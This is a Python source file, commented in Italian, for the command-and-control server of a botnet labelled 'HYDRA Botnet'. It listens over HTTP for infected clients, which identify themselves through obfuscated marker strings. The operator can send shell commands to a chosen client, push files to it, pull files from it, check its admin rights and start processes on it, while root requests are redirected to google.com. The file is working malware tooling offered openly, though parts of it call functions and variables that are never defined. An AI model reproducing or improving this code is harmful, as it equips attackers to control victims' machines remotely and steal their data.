#-*- coding: utf-8 -*-
#!/usr/bin/env python
#Malcolm Mami
#Tested and working on python 3.10.0
from http.server import BaseHTTPRequestHandler, HTTPServer
import threading
import time
import keyboard
import os
import os.path
import cgi
from datetime import datetime
import shutil

host_name = ('0.0.0.0')
host_port = (8080)

# Parametri generali di funzionamento
clients = []
active_client = []
data_command_shell = ('')
file_download_name = ('')

client_isDownloading = False
timeout_running = False
nextcmd_enabled = False
disableSelection = False

# script manifesto
def show_manifest():
    print(' HYDRA Botnet 1.0.5.0 by SuperMalc\n')

def hint_menu():
    print('* TABELLA FUNZIONI *\n')
    print('upload    :  Esegue un upload di un file sul client')
    print('grab      :  Esegue un download di un file dal client')
    print('admck     :  Verifica permessi amministrativi shell')
    print('exec      :  Esegue nuovo processo in thread separato')
    
# Thread di timeout
def clock_timeout(s):
    while True:
        global data_command_shell
        global nextcmd_enabled        
        global active_client
        
        # Verifica se disponibile il prossimo invio dei comandi (dipende se ho ricevuto i dati dal client) di default non disponibile
        if nextcmd_enabled:
            data_command_shell = input(active_client[0]+'>')
            nextcmd_enabled = False
            
        else:
            # Non ho ricevuto i dati dal client quindi attendo
            time.sleep(0.5)

def wait_connections():
    print('[+] In attesa di connessioni in arrivo [Ctrl] + [Alt] ---> [selettore client]\n')

def getFileSize(FileToUploadName):

    A = ('Byte')
    B = ('KB')
    C = ('MB')
    
    F_SZ = 0
    Target = ('')
    
    # Controllo se FileToUploadName e' un int
    if (isinstance(FileToUploadName, int)):
        # integer quindi ho gia il peso del file
        filesz = FileToUploadName
        
    else:
        # string quindi controllo il peso del file
        filesz = os.path.getsize(FileToUploadName)

    if (filesz < 750000):
    
        if (filesz < 1000): # ragiono in bytes
            F_SZ = filesz
            Target = A
            
        else: # ragiono in kilobytes            
            F_SZ = round((filesz/1024),2)
            Target = B
            
    else: # ragiono in megabytes    
        F_SZ = round((filesz/1048576),2)
        Target = C
        
    return F_SZ, Target, filesz


def keyinput_listener(): # thread per la gestione delle connessioni in arrivo

    print('[' + datetime.now().strftime("%d/%m/%Y %H:%M:%S") + '] server in ascolto >> ' + host_name + ':' +str(host_port))
    wait_connections()
    
    global disableSelection
        
    while True:
        if not disableSelection:
            try:
                if keyboard.is_pressed('Ctrl') and keyboard.is_pressed('Alt'):
                    print('\nClient disponibili:')
                    time.sleep(0.8)
                        
                    if (len(clients) < 1):
                        print('Nessun client disponibile al momento\n')
                        time.sleep(2)
                        os.system(clearstring)
                        print_manifest()
                        wait_connections()

                    else:
                    
                        for i in range(0,len(clients)):
                            print('('+str(i+1)+') ' + clients[i])

                        print('\n Inserisci il client desiderato (0 per annullare)')
                        selector = input(' Numero: ')

                        n = int(selector)
                            
                        if (n == 0):
                            print('[-] Selezione annullata')
                            time.sleep(1)
                            os.system(clearstring)
                            print_manifest()
                            wait_connections()
                            
                            for i in range(0,len(clients)):
                                print('('+str(i+1)+') ' + clients[i])
                            
                        elif (n > len(clients)):
                                print('[!] Client inesistente')                        

                        else:
                            active_client.append(clients[n-1])
                            print('[' + datetime.now().strftime("%H:%M:%S") + '] connessione a ' + clients[n-1] + ' [attendere che il client risponda]')
                            
                            disableSelection = True # disabilita la selez. del client

            except:
                continue
        # tempo di attesa per il loop ricerca connessioni client
        time.sleep(0.5)

class HttpServerHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        filename = self.path[1:]
        
        if filename==('') or ('favicon.ico') in filename:
            self.send_response(301)
            self.send_header("Location", REDIRECTIONS.get(self.path, LAST_RESORT))
            self.end_headers()
            
        else: # wget download (upload di un file dal client al server)
        
            with open(filename, 'rb') as f:
                self.send_response(200)
                self.send_header("Content-Type", 'application/octet-stream')
                self.send_header("Content-Disposition", 'attachment; filename="{}"'.format(os.path.basename(filename)))
                fs = os.fstat(f.fileno())
                self.send_header("Content-Length", str(fs.st_size))
                self.end_headers()
                shutil.copyfileobj(f, self.wfile)                
                

    def do_POST(self):    
        if (self.path == '/store'):
        
            try:
                ctype, pdict = cgi.parse_header(self.headers.get('content-type'))
                
                if (ctype == 'multipart/form-data'):
                
                    fs = cgi.FieldStorage(fp = self.rfile, headers = self.headers, environ={ 'REQUEST_METHOD':'POST' })
                
                else:
                    print('Errata POST request')
                    
                fs_up = fs['file']
                
                global file_download_name
                
                with open(file_download_name, 'wb') as o:
                    o.write( fs_up.file.read() )
                    self.send_response(200)
                    self.end_headers()    

            except Exception as e:
                print(e)
                
            return    
    
    
        self.send_response(200)
        self.end_headers()
        length = int(self.headers['Content-Length'])
        
        # Leggo i dati ottenuti
        # i dati hanno codifica binaria
        data_recv = self.rfile.read(length)
        # conversione da stringa a binario
        data_recv = str(data_recv,'utf-8')

        # Disabilita apparizione nuove client
        global disableSelection        
        
        if data_recv.startswith('@~id'):
        
            data_recv = data_recv[4:]
            
            if data_recv not in clients:
            
                if disableSelection:
                
                    clients.append(data_recv)
                    
                else:
                    clients.append(data_recv)
                    print('[' + datetime.now().strftime("%H:%M:%S") + '] ' + data_recv)
                    
                self.wfile.write(b'continue_sleep')
                
            elif data_recv in active_client:
            
                global data_command_shell
                global timeout_running
                global nextcmd_enabled
                global client_isDownloading
                global fileNameRAW
                global fileDimensionRAW
                
                lock = threading.Lock()
                
                if not timeout_running:
                    timeout = threading.Thread(target=clock_timeout, args=(self,))
                    timeout.start()
                    timeout_running = True
                    
                # sincronizzo il lock col thread
                lock.acquire()
                    
                if (data_command_shell==''):
                    nextcmd_enabled = True
                    data_resp = (b'8#NULLBYT30$')
                    
                else:
                    data_resp_string = data_command_shell                    
                    data_command_shell = ('')
                    
                    # converto data_resp in binario
                    data_resp = str.encode(data_resp_string)
                    
                lock.release()

                # Visualizza menu comandi
                if (b'help') in data_resp:
                    hint_menu()
                    data_resp = (b'8#NULLBYT30$')
                    
                
                # FILE UPLOAD (SERVER >> CLIENT)
                if data_resp.startswith(b'upload '):
                
                    FileToUploadName = data_resp[7:] # binario                    
                    
                    if os.path.isfile(FileToUploadName): # controllo se esiste davvero
                    
                        # x = dimensione semplificata
                        # y = misura di grandezza (Byte, KB, MB)
                        # z = dimensione originale (valore in bytes)
                    
                        x,y,z = getFileSize(FileToUploadName)                        
                        
                        # Decodifico il nome del file da binario a stringa (str)
                        FileToUploadName = FileToUploadName.decode('ascii')
                        
                        print('[upload >> '+FileToUploadName+' '+str(x)+y+']')
                        
                        # codifico in binario il messaggio di risposta
                        message = str.encode('1n37dT0u'+FileToUploadName+'<#>'+str(z))
                        
                        data_resp = (message)
                        
                    else:
                        print('[SERVER]: Il file non esiste')
                        data_resp = (b'8#NULLBYT30$')
                        
                        
                if client_isDownloading:                  
                    nextcmd_enabled = False                    
                    data_resp = (b'14Y0KS74RTD0WNL0')                    
                        
                # .........................    
                # invio i comandi al client
                self.wfile.write(b'3NTERC0M' + data_resp)
            
            else:
                self.wfile.write(b'continue_sleep')
                
        elif data_recv.startswith('R3SU'):
            data_recv = data_recv[4:]
            print(data_recv)
            data_recv = ('')
            
        elif data_recv.startswith('UN945FT20193810V'): 
        
            print('[CLIENT]: il file non esiste')
            
        elif data_recv.startswith('0UPL04DW1LLS74R7'):            
            
            client_isDownloading = True
        
            data_recv = data_recv[16:]
            
            fileSplitter = data_recv.split('<#>')
            
            fileNameRAW = fileSplitter[0]        # nome del file che ricevo
            fileDimensionRAW = fileSplitter[1]   # grandezza in bytes del file che ricevo
            
            file_download_name = fileNameRAW
            
            x,y,z = getFileSize(int(fileDimensionRAW))
            
            print('[avvio download >> '+fileNameRAW+' '+str(x)+y+']')
            
            
        elif data_recv.startswith('1036FGTUSOL1029V'):
        
            file_dwnl_sz = os.path.getsize(fileNameRAW)
        
            # qui dovrei controllare se le dimensioni del file scaricato corrispondono!!!
            if (int(fileDimensionRAW)==file_dwnl_sz):
            
                print('[' + fileNameRAW + " : " + fileDimensionRAW + ' bytes OK]')
                client_isDownloading = False
                nextcmd_enabled = True
            else:
                print('Download fallito')
                client_isDownloading = False
                nextcmd_enabled = True
                
            
        elif 'C0NNW41T' in data_recv:
            # idle mode
            time.sleep(5)
            
        elif 'C0NN_CL0SE' in data_recv:
            print('Disconnesso da: '+active_client[0])
            del active_client[:]
            del clients[:]
            wait_connections()
            # Riabilita la selezione del client
            disableSelection = False
        
        else:
            print(data_recv)       


if (__name__ == '__main__'):

    REDIRECTIONS = {"/google/": "http://google.com/"}
    LAST_RESORT = "http://google.com/"

    show_manifest()
    
    server = HTTPServer((host_name, host_port), HttpServerHandler)
    
    key_input = threading.Thread(target=keyinput_listener)
    key_input.start()    
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        server.server_close()